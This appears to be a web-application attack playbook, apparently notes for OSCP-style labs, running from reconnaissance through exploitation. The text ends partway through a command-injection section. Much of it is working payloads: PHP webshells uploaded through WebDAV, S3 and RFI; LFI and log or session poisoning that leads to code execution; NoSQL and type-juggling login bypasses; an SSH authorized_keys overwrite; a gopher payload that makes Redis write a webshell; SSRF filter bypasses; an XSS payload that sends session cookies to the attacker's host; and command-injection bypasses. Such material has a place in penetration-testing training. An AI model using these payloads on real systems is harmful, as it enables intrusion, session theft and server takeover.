# Web Application Attack Methodology

> *Operational Workflow: Reconnaissance (Phases 1-3.6) -> Vector Identification -> Exploitation (Phases 4-16) -> RCE -> Stable Reverse Shell (Phase 17)*
> *Essential Cheatsheets: [[🟠 BurpSuite|Burp Suite]], [[🔎 nmap|Nmap]], [[🟣 gobuster-ffuf|Gobuster & FFuF]], [[💉 sql-injection|SQL Injection]], [[🐢 reverse-shells|Reverse Shells]], [[🐢 msfvenom|MSFvenom]]*

---

# RECONNAISSANCE

## Phase 1: Manual Inspection

> *Perform these manual checks immediately while automated scanning tools run in the background.*

### 1.1: Low-Hanging Fruit
Inspect standard sensitive files, administrative disclosures, and configuration endpoints:
```bash
# Check crawler guidance, sitemaps, and security contact details
http://[TARGET_IP]/robots.txt
http://[TARGET_IP]/sitemap.xml
http://[TARGET_IP]/.well-known/security.txt

# Check for exposed version control, environment files, and configuration backups
http://[TARGET_IP]/.git/HEAD
http://[TARGET_IP]/.env
http://[TARGET_IP]/.env.backup
http://[TARGET_IP]/config.php.bak
http://[TARGET_IP]/web.config.bak
```

### 1.2: Source Code and Comments Inspection
- Press `Ctrl+U` to view the raw HTML source of every newly discovered page.
- Use `Ctrl+F` to search for high-value keywords: `TODO`, `password`, `admin`, `api`, `version`, `secret`, `key`, `debug`, `.js`, `token`.
- Review referenced JavaScript assets:
  - Inspect custom application scripts (e.g., `/js/app.js`, `/static/main.js`) for unauthenticated API endpoints, client-side validation logic, and hardcoded API tokens.
  - Check for JavaScript source maps (`.js.map`), which reveal original unobfuscated source code.

### 1.3: Banner Grabbing and Response Headers
Analyze server response headers for version information and security settings:
```bash
curl -I -v http://[TARGET_IP]/
```
- Observe the `Server:` header (e.g., `Apache/2.4.18`, `nginx/1.14.0`, `Microsoft-IIS/10.0`).
- Observe technology-specific headers (e.g., `X-Powered-By: PHP/5.5.9`, `X-AspNet-Version`).
- Feed discovered software versions into `searchsploit`:
```bash
searchsploit "Apache 2.4.18"
searchsploit "PHP 5.5.9"
```

### 1.4: Technology Fingerprinting
Run automated web technology fingerprinting:
```bash
whatweb -a 3 http://[TARGET_IP]/
```
- Identifies CMS frameworks (WordPress, Joomla, Drupal), underlying programming languages, JavaScript libraries, and web server software.
- High-level CMS identification triggers specific exploitation methodologies detailed in [[#Phase 15: CMS Exploitation Workflows]].

### 1.5: HTTP Methods and WebDAV Discovery
Test which HTTP methods are accepted by the web server:
```bash
# Check allowed HTTP verbs on the target root
curl -s -I -X OPTIONS http://[TARGET_IP]/
```
- If methods like `PUT`, `DELETE`, or `PROPFIND` are returned:
  - The server may have WebDAV enabled or improper HTTP method restrictions.
  - Connect and audit WebDAV using `cadaver`:
```bash
# Connect to suspected WebDAV directory
cadaver http://[TARGET_IP]/webdav/

# Automated WebDAV vulnerability test
davtest -url http://[TARGET_IP]/webdav/

# Direct upload test using cURL
curl -X PUT http://[TARGET_IP]/webdav/shell.php -d @shell.php
```
- If `PUT` is allowed, attempt uploading a reverse shell directly into the document root.

### 1.6: WAF Identification and Probing
Detect whether an active Web Application Firewall (WAF) or Reverse Proxy is intercepting traffic:
```bash
# Automated WAF detection via wafw00f
wafw00f http://[TARGET_IP]/
```
- Common WAF indicators: HTTP 403 Forbidden on common fuzzing characters (`'`, `"`, `<script>`, `;`), sudden rate-limiting (HTTP 429), or distinct headers (`CF-RAY`, `Server: cloudflare`).
- Evasion strategies: Reduce thread count (`-t 1`), add delay intervals, use Base64 encoding for command execution, or switch to alternative character encodings.

### 1.7: Git Repository Exposure and Extraction
If `http://[TARGET_IP]/.git/` is accessible, the entire application source code can be restored locally:
```bash
# Dump the exposed git repository using git-dumper
git-dumper http://[TARGET_IP]/.git/ ./dumped_repo/

# Inspect commit history and previous branches for leaked passwords or keys
cd ./dumped_repo/
git log -p
git diff HEAD^
git status
```

---

## Phase 2: Directory and Content Fuzzing

> *See the [[🟣 gobuster-ffuf|Gobuster and FFuF Cheatsheet]] for full parameter and flag references.*

### 2.1: Fast Initial Discovery
Run a high-speed scan against standard paths:
```bash
gobuster dir -u http://[TARGET_IP]/ -w /usr/share/wordlists/dirb/common.txt -t 30
```

### 2.2: Deep Directory Scan with File Extensions (CRITICAL)
Perform a thorough enumeration using file extensions relevant to the identified tech stack:
```bash
gobuster dir -u http://[TARGET_IP]/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,bak,old,zip,json,conf,ini,sql,xml \
  -t 40
```
> ⚠️ **Warning:** Without the `-x` extension flag, directory fuzzers only discover directory paths. Sensitive backup files like `config.php.bak`, database dumps like `backup.sql`, or administrator documentation like `notes.txt` will be completely missed.

### 2.3: Recursive Scanning and Wordlist Escalation
If initial wordlists yield nothing or return generic error responses:
1. Escalate to comprehensive SecLists collections:
   - `/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt`
   - `/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt`
2. Run targeted recursive fuzzing on any discovered non-standard directories (e.g., `/admin/`, `/dev/`, `/api/`, `/uploads/`).

### 2.4: Hidden Parameter Fuzzing with FFuF
When an identified script (such as `index.php`, `page.php`, or `view.php`) displays a blank page or default layout without query parameters, fuzz for hidden parameters:
```bash
# Fuzz for hidden GET parameters
ffuf -u "http://[TARGET_IP]/page.php?FUZZ=test" \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -fs [DEFAULT_PAGE_SIZE]

# Fuzz for hidden POST parameters
ffuf -u "http://[TARGET_IP]/page.php" \
     -X POST -d "FUZZ=test" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -fs [DEFAULT_PAGE_SIZE]
```

---

## Phase 3: Virtual Host (vHost) and Subdomain Fuzzing

> *A single target IP often hosts multiple virtual websites. The primary attack vector may be hosted on an internal domain name not exposed on the default IP site.*

### 3.1: Host Header Mapping (etc-hosts)
Whenever a domain name or hostname is identified (via HTTP redirects, SSL certificates, or SMB enumeration), map it locally:
```bash
echo "[TARGET_IP] corp.local target.local" | sudo tee -a /etc/hosts
```

### 3.2: Fuzzing Virtual Hosts with FFuF
Fuzz the `Host` header to uncover hidden virtual hosts:
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -H "Host: FUZZ.corp.local" \
     -u http://[TARGET_IP]/
```

### 3.3: Filtering False Positives
Virtual host fuzzers frequently return default wildcard pages with an identical HTTP status code (such as 200 OK) for every request. Filter these responses:
```bash
# Filter out default response size (e.g., 2395 bytes)
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -H "Host: FUZZ.corp.local" \
     -u http://[TARGET_IP]/ \
     -fs 2395

# Alternative: filter by word count (-fw) or line count (-fl)
ffuf -w [WORDLIST] -H "Host: FUZZ.corp.local" -u http://[TARGET_IP]/ -fw [WORD_COUNT]
```

### 3.4: HTTPS Virtual Host Fuzzing
When auditing SSL/TLS enabled endpoints:
```bash
ffuf -w [WORDLIST] -H "Host: FUZZ.corp.local" -u https://[TARGET_IP]/ -k -fs [DEFAULT_SIZE]
```
> 💡 **Tip:** Whenever a new virtual host is confirmed:
> 1. Add it immediately to `/etc/hosts`.
> 2. Restart Phase 1 (Manual Inspection) and Phase 2 (Directory Fuzzing) against the newly discovered vHost.

---

## Phase 3.5: REST API Enumeration

> *Modern web applications frequently expose REST APIs. These services return JSON or XML and commonly expose unauthenticated administrative actions, logic flaws, or parameter tampering vectors.*

### Identifying REST APIs
Key indicators of REST API presence:
- HTTP responses in JSON: `Content-Type: application/json`.
- Web frameworks: Python (Werkzeug, Flask, FastAPI), Node.js (Express), or ASP.NET Web API.
- Endpoints containing `/api/`, `/v1/`, `/v2/`, `/swagger/`, `/docs`, `/openapi.json`.

### API Route Fuzzing with Pattern Files
REST APIs are standardly versioned (`/v1`, `/v2`). Use pattern fuzzing with Gobuster to combine route dictionaries with version prefixes:
```bash
# Create a pattern definition file
echo '{GOBUSTER}/v1' > pattern.txt
echo '{GOBUSTER}/v2' >> pattern.txt
echo 'api/{GOBUSTER}/v1' >> pattern.txt

# Fuzz routes using the pattern file
gobuster dir -u http://[TARGET_IP]:[PORT]/ -w /usr/share/wordlists/dirb/big.txt -p pattern.txt
```
Gobuster will automatically test combinations like `/users/v1`, `/books/v2`, and `/api/auth/v1`.

### Interacting with API Endpoints via cURL
Test discovered endpoints using `curl` and inspect structured responses:
```bash
# Retrieve data from an endpoint and format JSON output
curl -s http://[TARGET_IP]:[PORT]/users/v1 | python3 -m json.tool

# Test user authentication
curl -X POST -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"test"}' \
  http://[TARGET_IP]:[PORT]/users/v1/login

# Test registration and mass assignment (privilege escalation via extra JSON parameters)
curl -X POST -H 'Content-Type: application/json' \
  -d '{"username":"hacker","password":"pwned","email":"h@h.com","admin":true,"role":"admin"}' \
  http://[TARGET_IP]:[PORT]/users/v1/register
```

### HTTP Verb Tampering on APIs
If an endpoint rejects a request with `405 Method Not Allowed` or `403 Forbidden`, test alternative HTTP verbs:
```bash
# If POST is rejected with 405, attempt PUT or PATCH
curl -X PUT -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer [TOKEN]' \
  -d '{"password":"new_admin_password"}' \
  http://[TARGET_IP]:[PORT]/users/v1/admin/password
```
> 💡 **OSCP Rule of Thumb:** If `GET` fails, test `POST`. If `POST` fails, test `PUT`, `PATCH`, and `DELETE`. Always attempt to create an administrative user or overwrite existing user credentials via mass assignment.

---

## Phase 3.6: Cloud Storage and S3 API (MinIO, AWS)

> *Applications occasionally synchronize assets with cloud or local S3-compatible object stores such as MinIO or LocalStack. Misconfigured or open S3 buckets are a direct path to sensitive data disclosure and remote code execution.*

### Identifying Open S3 Buckets
Key indicators:
- Web pages mentioning "Cloud Sync", "Storage Sync", or "Backup Drive".
- XML responses starting with `<ListBucketResult>` (definitive proof of an exposed bucket).
- Port **9000** open (default MinIO console / S3 API port).
- Folders such as `/storage/`, `/s3/`, `/bucket/` discovered during directory enumeration.

### Enumeration with AWS CLI
The official `aws` CLI tool interacts seamlessly with local or custom S3 instances using the `--endpoint-url` flag:
```bash
# 1. Configure dummy credentials (required by AWS CLI even for public buckets)
aws configure
# AWS Access Key ID: dummy
# AWS Secret Access Key: dummy
# Default region name: us-east-1
# Default output format: json

# 2. List buckets available on the target host
aws --endpoint-url http://[TARGET_IP]:[PORT] s3 ls

# 3. List the contents of a specific bucket (e.g., "storage")
aws --endpoint-url http://[TARGET_IP]:[PORT] s3 ls s3://storage/

# 4. Download high-value files
aws --endpoint-url http://[TARGET_IP]:[PORT] s3 cp s3://storage/users.csv ./users.csv
```

### Exploitation: Webshell Upload to S3 Bucket
If the bucket allows write operations (`PUT`) and the web application serves content directly from this storage location:
```bash
# 1. Generate a webshell or reverse shell payload
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# 2. Upload the shell into the bucket via AWS CLI
aws --endpoint-url http://[TARGET_IP]:[PORT] s3 cp shell.php s3://storage/

# 3. Fallback: Direct upload via HTTP PUT if AWS CLI is unavailable
curl -X PUT http://[TARGET_IP]:[PORT]/storage/shell.php -d '<?php system($_GET["cmd"]); ?>'
```
Trigger execution by accessing the uploaded file URL: `http://[TARGET_IP]/storage/shell.php?cmd=id`.

---

# EXPLOITATION VECTORS

> *Triage Matrix: Select the corresponding attack phase based on discovered inputs and technologies.*

| Observed Vector / Finding | Target Phase |
| --- | --- |
| Login portal / authentication forms / credential checks | [[#Phase 4: Authentication Bypass and Logic Flaws]] |
| Object IDs in parameters (`?id=`, `?user_id=`) | [[#Phase 5: IDOR (Insecure Direct Object References)]] |
| File or path parameters (`?page=`, `?file=`, `?doc=`) | [[#Phase 6: File Inclusion (LFI, RFI) and Path Traversal]] |
| URL fetching features, PDF generators, webhooks | [[#Phase 7: SSRF (Server-Side Request Forgery)]] |
| User input reflected on page or stored in admin logs | [[#Phase 8: Cross-Site Scripting (XSS)]] |
| Multiple simultaneous state actions (coupons, balance) | [[#Phase 9: Race Conditions (TOCTOU)]] |
| System diagnostic tools, ping, traceroute, converters | [[#Phase 10: OS Command Injection]] |
| Search bars, query parameters, SQL database errors | [[#Phase 11: SQL Injection (SQLi)]] |
| JSON Web Tokens (`eyJ...`), Bearer authentication | [[#Phase 11.5: JWT Attacks]] |
| File upload forms (avatars, attachments, media) | [[#Phase 12: File Upload Vulnerabilities]] |
| Template syntax reflected (`{{7*7}}`, `${7*7}`) | [[#Phase 13: SSTI (Server-Side Template Injection)]] |
| XML parsing endpoints, SOAP services, SVG uploads | [[#Phase 14: XXE (XML External Entity Injection)]] |
| WordPress, Drupal, Joomla, Apache Tomcat, Jenkins | [[#Phase 15: CMS Exploitation Workflows]] |
| Serialized objects (`rO0AB`, `\x80\x04\x95`, `__VIEWSTATE`, `O:`, `_$$ND_FUNC$$_`) | [[#Phase 16: Deserialization Vulnerabilities]] |
| Restricted Java execution context failing standard shells | [[#Phase 17: Java Runtime.exec() Reverse Shells in Restricted Environments]] |
| REST API endpoints (`/api/`, `/v1/`, JSON payloads) | [[#Phase 3.5: REST API Enumeration]] |
| MinIO / S3 buckets (Port 9000, `<ListBucketResult>`) | [[#Phase 3.6: Cloud Storage and S3 API (MinIO, AWS)]] |

---

## Phase 4: Authentication Bypass and Logic Flaws

### 4.1: Username Enumeration and Brute-Force Attacks

**Detection:** Submit a test login with non-existent user `testuser12345` and observe error messages.
- A differential response (e.g., "User does not exist" vs "Invalid password for user") confirms enumerable usernames.

```bash
# Enumerate valid usernames using error response filtering
ffuf -w /usr/share/seclists/Usernames/Names/names.txt \
     -X POST -d "username=FUZZ&password=InvalidPassword123!" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://[TARGET_IP]/login -mr "Invalid password"
```

> 💡 **OSCP Priority:** Always test standard default credentials first (`admin:admin`, `admin:password`, `root:root`, `guest:guest`, username=password). Automated brute-forcing is slow and should remain a targeted fallback.

### 4.2: Brute-Forcing ASP.NET Web Forms (The ViewState Trap)
In ASP.NET applications (`.aspx`), pages maintain state across requests using hidden cryptographic fields. Submitting a login request without valid state parameters causes the server to reject the submission:
- **Required Hidden Fields:** `__VIEWSTATE`, `__EVENTVALIDATION`, and `__VIEWSTATEGENERATOR`.

```bash
# 1. View page source (Ctrl+U) on the login page and extract the current base64 strings.
# 2. Pass the extracted state strings into Hydra's http-post-form module:
hydra -l admin -P /usr/share/wordlists/rockyou.txt [TARGET_IP] http-post-form \
  "/login.aspx:__VIEWSTATE=[LONG_BASE64_STRING]&__EVENTVALIDATION=[LONG_BASE64_STRING]&username=^USER^&password=^PASS^&LoginButton=Log+in:Login failed"
```
> ⚠️ **Note:** Ensure all special characters in hidden fields are properly URL-encoded.

### 4.3: Password Reset Poisoning
**Detection:** Intercept the password reset request in Burp Suite Repeater.
**Exploitation:**
- **HTTP Parameter Pollution:**
  `POST /reset-password`
  `username=admin&email=admin@target.local&email=attacker@kali.local`
- **Host Header Manipulation:** Change the `Host:` header to your Kali machine IP. If the server constructs password reset links using the client Host header, the reset token will be transmitted directly to your `netcat` listener.

### 4.4: Cookie and Session Token Tampering
**Detection:** Inspect cookies via Developer Tools (`F12 -> Application/Storage -> Cookies`) or Burp Suite.
- Look for cleartext flags such as `admin=false`, `role=user`, or simple integer user IDs (`user_id=105`).
- If values are base64 encoded, decode and inspect them:
```bash
echo -n "eyJ1c2VyIjoidGVzdCIsImFkbWluIjpmYWxzZX0=" | base64 -d
```
- Modify `admin=false` to `admin=true`, re-encode to base64, and replace the cookie in subsequent requests.

### 4.5: NoSQL Injection Authentication Bypass (MongoDB and Express)
When applications use NoSQL document stores (such as MongoDB with Express or Mongoose), queries handle associative arrays and JSON structures directly. Inject NoSQL comparison operators:

```bash
# JSON Body Payload (POST requests with application/json)
{
  "username": {"$gt": ""},
  "password": {"$gt": ""}
}

# Alternative JSON Operator ($ne = Not Equal)
{
  "username": "admin",
  "password": {"$ne": "wrongpassword"}
}

# URL-Encoded Form Parameters (application/x-www-form-urlencoded)
username[$ne]=admin&password[$ne]=admin
username[$gt]=&password[$gt]=
```

### 4.6: PHP Loose Comparison and Type Juggling
PHP's loose comparison operator (`==`) converts string types when compared against integers or boolean values:
- `"admin" == 0` evaluates to `true` in PHP versions prior to PHP 8.
- If JSON parameters are accepted, submit integer or boolean values instead of strings:
```json
{
  "username": "admin",
  "password": true
}
```
- **Magic Hashes (MD5 / SHA1 loose collision):** Hashes starting with `0e` followed solely by digits evaluate to `0` in loose comparison:
  - `240610708` -> MD5 `0e462097431906509019562988736854` (evaluates as `0`)
  - `QNKCDZO` -> MD5 `0e830400451993494058024219903391` (evaluates as `0`)

### 4.7: Default Credentials Quick Reference Table

| Target Application / Platform | Default Username | Default Password |
| --- | --- | --- |
| **Apache Tomcat** | `tomcat`, `admin`, `manager` | `tomcat`, `admin`, `s3cret`, `role1` |
| **pfSense Firewall** | `admin` | `pfsense` |
| **Jenkins Automation** | `admin`, `jenkins` | `admin`, `password`, `jenkins` |
| **phpMyAdmin** | `root`, `pma` | *(empty string)*, `root`, `toor` |
| **WordPress** | `admin` | `admin`, `password`, `admin123` |
| **Joomla** | `admin`, `administrator` | `admin`, `admin123` |
| **Grafana** | `admin` | `admin` |
| **Zabbix** | `Admin` *(capitalized)* | `zabbix` |

---

## Phase 5: IDOR (Insecure Direct Object References)

> *Insecure Direct Object References occur when an application accepts user-supplied input to reference database objects directly without verifying authorization.*

**Detection:** Search for parameters exposing database identifiers:
- `?id=12`, `?user_id=45`, `?account_no=1004`, `?doc_id=9812`
- RESTful URL paths: `/api/users/12/profile`, `/invoices/1042.pdf`

**The Two-Account Testing Methodology:**
1. Log in with low-privileged account `User_A` and note its record ID (e.g., `id=100`).
2. Log in with second test account `User_B` and note its record ID (e.g., `id=101`).
3. While authenticated as `User_A`, issue a request targeting `id=101`.
4. If `User_B`'s private profile or data is returned, an IDOR vulnerability is confirmed.

**Mass Extraction via Burp Suite Intruder:**
- Configure an Intruder attack targeting the ID parameter.
- Set payload type to **Numbers** (range 1 to 500, step 1).
- Analyze response lengths and status codes to identify administrative accounts or confidential documents.

**Escalation Path to RCE:**
- IDOR on profile update / password reset endpoints -> account takeover of Administrator.
- IDOR on document/configuration export endpoints -> leakage of cleartext SSH keys or database credentials.

---

## Phase 6: File Inclusion (LFI, RFI) and Path Traversal

> *See the [[🟠 BurpSuite|Burp Suite Cheatsheet]] for payload fuzzing and automated repeater workflows.*

**Detection:** Audit parameters that reference files, templates, or system resources:
- `?page=about.php`, `?file=report.pdf`, `?template=header`, `?view=home`
- Check cookie values (`Cookie: lang=en.php`) and HTTP POST bodies.

### 6.1: Basic Path Traversal Payloads
```bash
# Linux targets
?page=../../../../../../../../etc/passwd

# Windows targets
?page=../../../../../../../../windows/win.ini
?page=../../../../../../../../boot.ini
```

### 6.2: Filter Bypass Techniques
| Filter Technique | Bypass Payload |
| --- | --- |
| `../` stripped non-recursively | `....//....//....//etc/passwd` or `..././..././etc/passwd` |
| URL encoded traversal | `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd` |
| Double URL encoded traversal | `%252e%252e%252f%252e%252e%252fetc%252fpasswd` |
| Absolute path validation | `/etc/passwd` or `C:\windows\win.ini` |
| Extension appended (`.php` forced) | `../../../../etc/passwd%00` *(PHP < 5.3.4 only)* or `../../../../etc/passwd/./` |

### 6.3: PHP Stream Wrappers (Bypassing Filters)

#### Reading Source Code (php-filter)
When requesting a `.php` file via standard LFI, the server executes the script and renders the output instead of showing source code. Use the base64 conversion filter to extract source code:
```bash
# Retrieve base64-encoded source code of target script
curl -s "http://[TARGET_IP]/index.php?page=php://filter/convert.base64-encode/resource=config.php"

# Decode output locally to reveal database credentials and encryption keys
echo "[BASE64_STRING]" | base64 -d
```

#### Direct Code Execution (data-wrapper)
If `allow_url_include = On` in `php.ini`, execute PHP code directly without uploading a file:
```bash
# Cleartext data stream execution
curl "http://[TARGET_IP]/index.php?page=data://text/plain,<?php%20system('id');?>"

# Base64-encoded data stream (bypasses WAF character filters)
echo -n '<?php system($_GET["cmd"]); ?>' | base64
# Returns: PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXTspOyA/Pg==

curl "http://[TARGET_IP]/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXTspOyA/Pg==&cmd=id"
```

### 6.4: Log Poisoning (LFI to RCE)
If an LFI is confirmed and the server logs client requests, inject PHP code into a service log and include that log via LFI.

#### Apache and Nginx Access Log Poisoning:
1. Inject PHP payload into the `User-Agent` header using `curl` or Burp Suite:
```bash
curl -s -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://[TARGET_IP]/
```
> ⚠️ **Warning:** Never use a web browser to perform log poisoning. Browsers URL-encode special characters like `<` and `?`, corrupting the log. A single syntax error in a poisoned log file will permanently disable PHP execution for that log.

2. Trigger the reverse shell via the LFI parameter:
```bash
# Linux Apache default access log path
http://[TARGET_IP]/index.php?page=../../../../var/log/apache2/access.log&cmd=id

# Linux Nginx default access log path
http://[TARGET_IP]/index.php?page=../../../../var/log/nginx/access.log&cmd=id

# Windows XAMPP Apache access log path
http://[TARGET_IP]/index.php?page=../../../../xampp/apache/logs/access.log&cmd=whoami
```

#### SSH Auth Log Poisoning (Alternative):
If web server logs are unreadable due to file permissions, poison the SSH authentication log:
```bash
# Attempt an SSH connection using the PHP payload as the username
ssh '<?php system($_GET["cmd"]); ?>'@[TARGET_IP]

# Include the SSH log via LFI
http://[TARGET_IP]/index.php?page=../../../../var/log/auth.log&cmd=id
```

### 6.5: High-Value Files to Inspect via LFI

| Target OS | Target File Path | Operational Value |
| --- | --- | --- |
| **Linux** | `/etc/passwd` | Valid system usernames and service accounts |
| **Linux** | `/etc/issue` or `/etc/os-release` | Precise Linux distribution and version |
| **Linux** | `/proc/self/environ` | Process environment variables, API keys, passwords |
| **Linux** | `/proc/self/cmdline` | Running process arguments, CLI credentials |
| **Linux** | `/var/log/apache2/access.log` | Web server access logs for log poisoning |
| **Linux** | `/var/log/auth.log` | SSH authentication logs for log poisoning |
| **Linux** | `/home/[USER]/.ssh/id_rsa` | User SSH private keys for immediate shell access |
| **Windows** | `C:\windows\system32\drivers\etc\hosts` | Internal network hostnames and mappings |
| **Windows** | `C:\windows\win.ini` | Confirms path traversal on Windows |
| **Windows** | `C:\xampp\passwords.txt` | Default XAMPP credentials |
| **Windows** | `C:\xampp\apache\conf\httpd.conf` | Apache configuration and virtual host paths |
| **Windows** | `C:\inetpub\wwwroot\web.config` | IIS database strings and MachineKeys |

### 6.6: SSH Key Overwrite via Path Traversal Upload
If a file upload feature allows path traversal in the destination filename (`filename="../../../root/.ssh/authorized_keys"`), achieve root access:
```bash
# 1. Generate an SSH keypair locally
ssh-keygen -t ed25519 -f ./id_ed25519 -N ""

# 2. Intercept the file upload request in Burp Suite and change the filename:
# Content-Disposition: form-data; name="file"; filename="../../../../../../root/.ssh/authorized_keys"
# Content-Type: text/plain
# [Insert contents of ./id_ed25519.pub]

# 3. Authenticate directly via SSH
ssh -i ./id_ed25519 root@[TARGET_IP]
```

### 6.7: Remote File Inclusion (RFI)
If `allow_url_include = On` in `php.ini`, host a PHP webshell on your Kali machine:
```bash
# Start an HTTP listener on Kali
python3 -m http.server 80

# Trigger RFI to execute remote payload
curl "http://[TARGET_IP]/index.php?page=http://[KALI_IP]/shell.txt&cmd=id"
```

### 6.8: PHP Session Poisoning
When an application uses PHP sessions and reflects user inputs into session storage, poison the session file:
1. Identify session cookie: `Cookie: PHPSESSID=hacker1234567890`.
2. Submit a payload into any field saved into session state (e.g., language selector or profile display name): `<?php system($_GET['cmd']); ?>`.
3. Include the corresponding session file via LFI:
```bash
http://[TARGET_IP]/index.php?page=../../../../var/lib/php/sessions/sess_hacker1234567890&cmd=id
# Alternative session paths: /tmp/sess_hacker1234567890 or /var/tmp/sess_hacker1234567890
```

### 6.9: php-input Direct POST Code Execution
If `allow_url_include = On`, stream raw PHP code directly into the PHP input stream:
```bash
curl -X POST "http://[TARGET_IP]/index.php?page=php://input" \
  -d "<?php system('id'); ?>"
```

---

## Phase 7: SSRF (Server-Side Request Forgery)

> *Server-Side Request Forgery occurs when the web application fetches a remote resource based on user-supplied URLs without restricting destination addresses.*

**Detection:** Identify features that interact with external URLs:
- `?url=`, `?feed=`, `?dest=`, `?server=`, `?target=`
- Document converters (HTML to PDF, image processors), webhook integrations, and "Import from URL" dialogues.

### 7.1: Basic Verification Payloads
```bash
# Test internal loopback access to sensitive services
http://[TARGET_IP]/fetch?url=http://127.0.0.1:80/admin
http://[TARGET_IP]/fetch?url=http://localhost:8080/manager/html
```

### 7.2: Filter Bypass Techniques
| Restriction | Bypass Payload |
| --- | --- |
| `127.0.0.1` blocked | `http://0/`, `http://0.0.0.0/`, `http://127.1/` |
| Decimal IP encoding | `http://2130706433/` (decimal representation of 127.0.0.1) |
| IPv6 loopback | `http://[::1]/` or `http://[::]/` |
| DNS resolution bypass | `http://127.0.0.1.nip.io` |
| Domain allow-list (`target.com`) | `http://target.com.attacker.com` or `http://attacker.com#target.com` |
| Open Redirect chaining | Point SSRF to a local open redirect: `?url=http://[TARGET_IP]/redirect?to=http://127.0.0.1:8080` |

### 7.3: Blind SSRF Detection
If the server fetches the URL without displaying the response content:
1. Start a `netcat` listener or HTTP server on your Kali machine:
```bash
sudo nc -lvnp 80
```
2. Inject your listener URL: `?url=http://[KALI_IP]/test`.
3. Check your listener for incoming HTTP requests or TCP connections.

### 7.4: Gopher Protocol for Internal Service Interaction
The `gopher://` URL scheme allows sending arbitrary raw TCP byte sequences. Interrogate internal non-HTTP daemons such as Redis:
```bash
# Send raw commands to local Redis instance (port 6379) via gopher:
gopher://127.0.0.1:6379/_flushall%0D%0ASET%20test%20%22%3C%3Fphp%20system(%24_GET%5B'cmd'%5D)%3B%3F%3E%22%0D%0ACONFIG%20SET%20dir%20%2Fvar%2Fwww%2Fhtml%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASAVE%0D%0A
```

### 7.5: Escalation to RCE
- **Internal service pivoting:** Interact with internal, unauthenticated management services such as Redis (Port 6379) or internal administrative panels.
- **Local file disclosure via `file://` schema:**
```bash
?url=file:///etc/passwd
?url=file:///C:/windows/win.ini
```

---

## Phase 8: Cross-Site Scripting (XSS)

> *OSCP Exam Reality: Focus almost exclusively on **Stored XSS** targeting simulated administrator bots that periodically review submitted tickets, user profiles, or system logs.*

**Detection and Injection Points:**
- **Stored in application database:** Support ticket titles/descriptions, "Contact Us" forms, user comments, account profile fields (First Name, Display Name).
- **Stored via HTTP headers:** Certain plugins or monitoring dashboards log `User-Agent` or `X-Forwarded-For` headers directly into a database and render them without sanitization on an administrative dashboard. Inject payloads into headers:
```bash
curl -s -H "User-Agent: <script src='http://[KALI_IP]/hook.js'></script>" http://[TARGET_IP]/
```

### 8.1: Verification PoC
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<h1>XSS-TEST</h1>
```

### 8.2: Session Cookie Hijacking Workflow
1. Start an HTTP listener on Kali to capture the stolen cookie:
```bash
sudo python3 -m http.server 80
```
2. Submit a cookie-stealing payload into the vulnerable field:
```html
<script>fetch('http://[KALI_IP]/steal?cookie=' + btoa(document.cookie));</script>
```
3. When the simulated administrator bot views the page, observe the incoming connection on your Kali listener:
```
GET /steal?cookie=cGhwc2Vzc2lkPWFkbWluMTIzNDU2 HTTP/1.1
```
4. Decode the captured base64 string:
```bash
echo "cGhwc2Vzc2lkPWFkbWluMTIzNDU2" | base64 -d
```
5. Inject the stolen administrative session cookie into your browser (`F12 -> Application/Storage -> Cookies`) and refresh the administrative portal.
6. Once logged in as Administrator, leverage administrative privileges to upload a webshell.

---

## Phase 9: Race Conditions (TOCTOU)

> ⚠️ **Low OSCP Exam Priority:** Rarely encountered in standard OSCP labs or exam machines, but critical when assessing multi-threaded actions.

**Concept:** Time-Of-Check to Time-Of-Use (TOCTOU). Exploits the delay between the server checking a condition (such as whether a discount code has been used, or whether an uploaded file is benign) and performing the corresponding action.

**Testing Methodology with Burp Suite Repeater:**
1. Capture the target request in Burp Suite and send it to **Repeater**.
2. Duplicate the tab 20 to 30 times.
3. Group the tabs together, choose **Send group in parallel**, and launch the attack simultaneously.
4. **Application to File Upload:** Upload `shell.php`. If an anti-virus or cleanup daemon automatically deletes unauthorized files after a 1-second delay, launch parallel requests requesting `/uploads/shell.php` to execute the reverse shell before deletion completes.

---

## Phase 10: OS Command Injection

> *OS Command Injection occurs when an application passes unsanitized user input directly to a system shell execution function (`system()`, `exec()`, `shell_exec()`, `os.system()`, `Runtime.exec()`).*

**Detection:** Test input fields that appear to interact with system utilities: ping forms, traceroute tools, DNS lookup tools, document converters, backup scripts.

### 10.1: Universal Command Injection Testing Checklist
Test these injection operators on **every** input field:
```bash
test                        # Baseline request (observe standard response)
test; whoami                # Direct semicolon command separation
test && whoami              # Logical AND chaining
test | whoami               # Pipe operator
test || whoami              # Logical OR chaining (executes whoami if test fails)
test `whoami`               # Backtick command substitution
test $(whoami)              # POSIX shell command substitution
" && whoami && echo "       # Double-quote breakout
' && whoami && echo '       # Single-quote breakout
```
> 💡 **OSCP Rule of Thumb:** If standard separators (`;`, `&&`) fail, your input is likely encapsulated within quotes in the application code. Break out of the quotes using `'` or `"`.

### 10.2: Filter Bypass Techniques
| Filter Mechanism | Bypass Technique |
| --- | --- |
| **Spaces blocked** | `${IFS}`, `$IFS$9`, or brace expansion: `{cat,/etc/passwd}` |
| **Direct command strings blocked** | Concatenation: `c""at` or `c\at` or `n''c` |
| **Path separators (`/`) blocked** | Use environment variables or base64 decoding |
| **All special characters filtered** | Encode payload in Base64 and pipe to shell (see below) |

